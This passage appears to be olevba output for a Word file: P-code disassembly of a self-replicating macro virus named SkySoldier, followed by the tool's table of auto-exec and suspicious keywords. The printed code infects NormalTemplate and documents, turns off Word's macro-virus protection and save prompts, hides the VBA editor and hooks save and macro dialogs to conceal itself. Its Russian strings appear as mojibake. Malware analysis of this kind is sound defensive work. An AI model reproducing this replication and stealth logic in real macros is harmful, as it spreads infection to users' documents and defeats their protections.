' 	Eq 
' 	IfBlock 
' Line #279:
' 	LitDI2 0x0001 
' 	St AInst 
' Line #280:
' 	Ld pth 
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #281:
' 	EndIfBlock 
' Line #282:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #283:
' 	Ld AInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set dc 
' 	EndIf 
' Line #284:
' 	Ld AInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set dc 
' 	EndIf 
' Line #285:
' 	Ld AInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #286:
' 	Ld pth 
' 	Ld dc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #287:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld dc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #288:
' 	Ld pth 
' 	ArgsCall Kill 0x0001 
' Line #289:
' 	EndIfBlock 
' Line #290:
' 	LitStr 0x0001 ","
' 	Ld AutoCorrect 
' 	ArgsMemLd Entries 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #291:
' 	StartWithExpr 
' 	Ld AutoCorrect 
' 	With 
' Line #292:
' 	LitVarSpecial (True)
' 	MemStWith CorrectInitialCaps 
' Line #293:
' 	LitVarSpecial (False)
' 	MemStWith CorrectSentenceCaps 
' Line #294:
' 	LitVarSpecial (True)
' 	MemStWith CorrectDays 
' Line #295:
' 	LitVarSpecial (True)
' 	MemStWith CorrectCapsLock 
' Line #296:
' 	LitVarSpecial (True)
' 	MemStWith ReplaceText 
' Line #297:
' 	EndWith 
' Line #298:
' 	OnError (Resume Next) 
' Line #299:
' 	Dim 
' 	VarDefn pdd
' 	VarDefn wd
' 	VarDefn r
' 	VarDefn s
' Line #300:
' 	SetStmt 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	Set wd 
' Line #301:
' Line #302:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld wd 
' 	MemLd Count 
' 	For 
' Line #303:
' Line #304:
' 	Ld r 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordDigger"
' 	Eq 
' 	IfBlock 
' Line #305:
' Line #306:
' 	LitStr 0x0009 "Âíèìàíèå!"
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0032 "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002F " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x005D "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì"
' 	Add 
' 	Ld vbOKOnly 
' 	Ld vbInformation 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #307:
' 	LitStr 0x0042 "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger"
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0023 " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002A "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x007B "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..."
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0022 "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x001E "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002F "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #308:
' 	GoSub 20 
' Line #309:
' Line #310:
' 	EndIfBlock 
' Line #311:
' 	StartForVariable 
' 	Ld r 
' 	EndForVariable 
' 	NextVar 
' Line #312:
' 	LineNum 20 
' 	Ld r 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld wd 
' 	ArgsMemCall Remove 0x0001 
' Line #313:
' Line #314:
' Line #315:
' 	Return 
' Line #316:
' Line #317:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set pdd 
' Line #318:
' Line #319:
' 	StartForVariable 
' 	Ld s 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld pdd 
' 	MemLd Count 
' 	For 
' Line #320:
' 	Ld s 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordDigger"
' 	Eq 
' 	IfBlock 
' Line #321:
' 	Ld s 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld pdd 
' 	ArgsMemCall Remove 0x0001 
' Line #322:
' 	LitStr 0x0009 "Âíèìàíèå!"
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0032 "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002F " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x005D "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì"
' 	Add 
' 	Ld vbOKOnly 
' 	Ld vbInformation 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #323:
' 	LitStr 0x0042 "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger"
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0023 " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002A "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x007B "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..."
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0022 "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x001E "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002F "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #324:
' 	EndIfBlock 
' Line #325:
' 	StartForVariable 
' 	Ld s 
' 	EndForVariable 
' 	NextVar 
' Line #326:
' 	EndSub 
' Line #327:
' 	FuncDefn (Sub AutoExec())
' Line #328:
' 	Dim 
' 	VarDefn o
' 	VarDefn l
' Line #329:
' 	OnError (Resume Next) 
' Line #330:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #331:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #332:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #333:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #334:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #335:
' 	LitStr 0x0001 ","
' 	Ld AutoCorrect 
' 	ArgsMemLd Entries 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #336:
' 	StartWithExpr 
' 	Ld AutoCorrect 
' 	With 
' Line #337:
' 	LitVarSpecial (True)
' 	MemStWith CorrectInitialCaps 
' Line #338:
' 	LitVarSpecial (False)
' 	MemStWith CorrectSentenceCaps 
' Line #339:
' 	LitVarSpecial (True)
' 	MemStWith CorrectDays 
' Line #340:
' 	LitVarSpecial (True)
' 	MemStWith CorrectCapsLock 
' Line #341:
' 	LitVarSpecial (True)
' 	MemStWith ReplaceText 
' Line #342:
' 	EndWith 
' Line #343:
' 	OnError (Resume Next) 
' Line #344:
' 	Dim 
' 	VarDefn pdd
' 	VarDefn wd
' Line #345:
' 	SetStmt 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	Set wd 
' Line #346:
' Line #347:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld wd 
' 	MemLd Count 
' 	For 
' Line #348:
' Line #349:
' 	Ld o 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordDigger"
' 	Eq 
' 	IfBlock 
' Line #350:
' Line #351:
' 	LitStr 0x0009 "Âíèìàíèå!"
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0032 "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002F " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x005D "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì"
' 	Add 
' 	Ld vbOKOnly 
' 	Ld vbInformation 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #352:
' 	LitStr 0x0042 "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger"
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0023 " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002A "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x007B "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..."
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0022 "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x001E "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002F "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #353:
' 	GoSub 20 
' Line #354:
' Line #355:
' 	EndIfBlock 
' Line #356:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' Line #357:
' 	LineNum 20 
' 	Ld o 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld wd 
' 	ArgsMemCall Remove 0x0001 
' Line #358:
' Line #359:
' Line #360:
' 	Return 
' Line #361:
' Line #362:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set pdd 
' Line #363:
' Line #364:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld pdd 
' 	MemLd Count 
' 	For 
' Line #365:
' 	Ld l 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordDigger"
' 	Eq 
' 	IfBlock 
' Line #366:
' 	Ld l 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld pdd 
' 	ArgsMemCall Remove 0x0001 
' Line #367:
' 	LitStr 0x0009 "Âíèìàíèå!"
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0032 "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002F " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x005D "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì"
' 	Add 
' 	Ld vbOKOnly 
' 	Ld vbInformation 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #368:
' 	LitStr 0x0042 "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger"
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0023 " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002A "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x007B "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..."
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0022 "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x001E "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x002F "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #369:
' 	EndIfBlock 
' Line #370:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	NextVar 
' Line #371:
' 	EndSub 
' Line #372:
' 	FuncDefn (Sub FileSave())
' Line #373:
' 	OnError (Resume Next) 
' Line #374:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #375:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #376:
' 	EndSub 
' Line #377:
' 	FuncDefn (Sub FileSaveAs())
' Line #378:
' 	OnError (Resume Next) 
' Line #379:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #380:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #381:
' 	EndSub 
' Line #382:
' 	FuncDefn (Sub ToolsOptions())
' Line #383:
' 	OnError (Resume Next) 
' Line #384:
' 	Dim 
' 	VarDefn dc (As Object)
' Line #385:
' 	Dim 
' 	VarDefn VirStat (As Byte)
' Line #386:
' 	Dim 
' 	VarDefn NorStat (As Byte)
' Line #387:
' 	Ld NStat 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #388:
' 	Ld VStat 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #389:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #390:
' 	SetStmt 
' 	LitStr 0x000A "xkySoldier"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set dc 
' Line #391:
' 	Ld Options 
' 	MemLd SaveNormalPrompt 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St NorStat 
' 	EndIf 
' Line #392:
' 	Ld Options 
' 	MemLd VirusProtection 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St VirStat 
' 	EndIf 
' Line #393:
' 	LitDI2 0x0002 
' 	LitStr 0x000C "const NStat="
' 	Ld NorStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #394:
' 	LitDI2 0x0003 
' 	LitStr 0x000C "const VStat="
' 	Ld VirStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #395:
' 	SetStmt 
' 	LitStr 0x000A "xkySoldier"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set dc 
' Line #396:
' 	LitDI2 0x0002 
' 	LitStr 0x000C "const NStat="
' 	Ld NorStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #397:
' 	LitDI2 0x0003 
' 	LitStr 0x000C "const VStat="
' 	Ld VirStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #398:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #399:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #400:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #401:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #402:
' 	EndSub 
' Line #403:
' 	FuncDefn (Sub ToolsMacro())
' Line #404:
' 	Dim 
' 	VarDefn i (As Byte)
' 	VarDefn n (As Integer)
' 	VarDefn pth (As String)
' Line #405:
' 	Dim 
' 	VarDefn NInst (As Boolean)
' 	VarDefn AInst (As Boolean)
' 	VarDefn Nsav (As Boolean)
' 	VarDefn Asav (As Boolean)
' 	VarDefn res (As Boolean)
' Line #406:
' 	Dim 
' 	VarDefn dc (As Object)
' 	VarDefn dcN (As Object)
' 	VarDefn dcA (As Object)
' Line #407:
' 	OnError (Resume Next) 
' Line #408:
' 	LitStr 0x0004 "temp"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000D "\~WRr000^.tmp"
' 	Concat 
' 	St pth 
' Line #409:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dcN 
' Line #410:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dcA 
' Line #411:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set dc 
' Line #412:
' 	GoSub 10 
' Line #413:
' 	Ld res 
' 	St NInst 
' Line #414:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set dc 
' Line #415:
' 	GoSub 10 
' Line #416:
' 	Ld res 
' 	St AInst 
' Line #417:
' 	Ld NInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #418:
' 	SetStmt 
' 	Ld dcN 
' 	Set dc 
' Line #419:
' 	GoSub 20 
' Line #420:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St Nsav 
' Line #421:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #422:
' 	EndIfBlock 
' Line #423:
' 	Ld AInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #424:
' 	SetStmt 
' 	Ld dcA 
' 	Set dc 
' Line #425:
' 	GoSub 20 
' Line #426:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St Asav 
' Line #427:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #428:
' 	EndIfBlock 
' Line #429:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #430:
' 	Ld pth 
' 	LitStr 0x000A "xkySoldier"
' 	ArgsLd dcN 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #431:
' 	Ld pth 
' 	LitStr 0x000A "xkySoldier"
' 	ArgsLd dcA 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #432:
' 	Ld pth 
' 	Ld dcN 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #433:
' 	Ld Nsav 
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #434:
' 	Ld pth 
' 	Ld dcA 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #435:
' 	Ld Asav 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #436:
' 	Ld pth 
' 	ArgsCall Kill 0x0001 
' Line #437:
' 	ExitSub 
' Line #438:
' 	LineNum 10 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #439:
' 	Ld i 
' 	Ld dc 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "xkySoldier"
' 	Eq 
' 	IfBlock 
' Line #440:
' 	LitDI2 0x0001 
' 	St res 
' Line #441:
' 	Ld pth 
' 	Ld i 
' 	Ld dc 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #442:
' 	EndIfBlock 
' Line #443:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #444:
' 	Return 
' Line #445:
' 	LineNum 20 
' 	Ld pth 
' 	Ld dc 
' 	ArgsMemCall Export 0x0001 
' Line #446:
' 	LitStr 0x000A "xkySoldier"
' 	ArgsLd dc 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St n 
' Line #447:
' 	LitDI2 0x0001 
' 	Ld n 
' 	LitStr 0x000A "xkySoldier"
' 	ArgsLd dc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #448:
' 	Return 
' Line #449:
' 	EndSub 
' Line #450:
' 	FuncDefn (Sub ViewVBCode())
' Line #451:
' 	QuoteRem 0x0000 0x0025 "If Dir("c:\xkySoldier.die") = "" Then"
' Line #452:
' 	QuoteRem 0x0000 0x0012 "MsgBox "Îñòîðîæíî""
' Line #453:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #454:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #455:
' 	EndSub 
' Line #456:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

